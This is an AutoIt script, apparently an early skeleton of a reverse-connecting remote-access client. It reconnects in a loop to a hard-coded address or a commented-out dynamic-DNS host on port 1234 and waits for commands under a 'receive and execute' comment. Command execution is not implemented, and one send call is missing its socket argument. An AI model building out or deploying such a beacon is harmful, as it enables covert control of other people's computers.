#include <Array.au3>
#include <WinAPI.au3>
Global $Socket
Global $Recibe

Global $IP 
Global $sDnsAddr = "xjhdshsdhagsafhg.ddns.net"
Global $PORT = 1234

$IP = "127.0.0.1"
;$IP  = TCPNameToIP($sDnsAddr)

While 1 ;Reconeccion
   _Conectar()
   TCPSend ($Socket,"Hola")
   While 1 ; Recibir y ejecutar
          $Recibe =""
          While $Recibe = ""
                 $Recibe=TCPRecv($Socket,10000000)
                 Sleep (100)
				 Select
					Case $Recibe = "a"
						TCPSend("bueno")
					Case Else
				EndSelect
		  WEnd
		  

   WEnd
WEnd
 
Func _Conectar()
   While TCPStartup()=0
          sleep (10)
   WEnd
   While True
          $Socket=TCPConnect ($IP,$PORT)
          If $Socket>0 Then
            ExitLoop
          EndIf
          Sleep(1000)
   WEnd   
EndFunc

